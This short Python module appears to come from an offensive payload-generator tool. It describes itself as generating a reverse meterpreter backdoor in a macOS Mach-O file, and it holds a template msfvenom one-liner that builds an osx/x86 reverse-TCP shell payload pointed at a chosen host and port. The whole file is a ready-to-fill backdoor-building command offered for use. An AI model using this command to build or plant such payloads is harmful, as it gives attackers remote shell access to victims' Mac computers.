class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Generate a reverse meterpreter backdoor into a macho file."
    function    = "Msfvenom Generator"
    liner       = 'msfvenom -p osx/x86/shell_reverse_tcp lhost="TARGET" lport=PORT -f macho > FILE_PATH.macho'
